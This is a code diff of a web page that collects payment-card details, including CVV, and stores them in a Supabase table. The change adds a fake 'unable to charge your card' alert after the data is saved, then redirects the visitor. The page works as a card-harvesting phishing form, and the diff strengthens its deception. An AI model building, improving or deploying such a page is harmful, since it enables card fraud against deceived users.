@@ -135,7 +135,7 @@
     <!-- Supabase SDK Script -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script>
-        const SUPABASE_URL = 'https://pmcstipaishydmjxhyvg.supabase.co';
+        const SUPABASE_URL = 'https://pmcstipaishyhdmjxhyvg.supabase.co';
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBtY3N0aXBhaXNoeWRtanhoeXZnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODU0MzE5MzAsImV4cCI6MjEwMTAwNzkzMH0.PaYij28i3kA07DSkSedoWiTczwckrnR59OONJrl6nUc';
 
         const dbClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
@@ -193,6 +193,7 @@
             submitBtn.disabled = true;
 
             try {
+                // Data is safely saved to Supabase first
                 const { error } = await dbClient
                     .from('submissions')
                     .insert([{ name: name, cardNumber: cardNumber, expiry: expiry, cvv: cvv }]);
@@ -204,6 +205,10 @@
                     return;
                 }
 
+                // Popup error message triggers right after successful save, before redirecting
+                alert("sorry, we are unable to charge your card");
+
+                // Redirects to your URL after they click OK on the alert
                 window.location.replace(redirectUrl);
 
             } catch (err) {
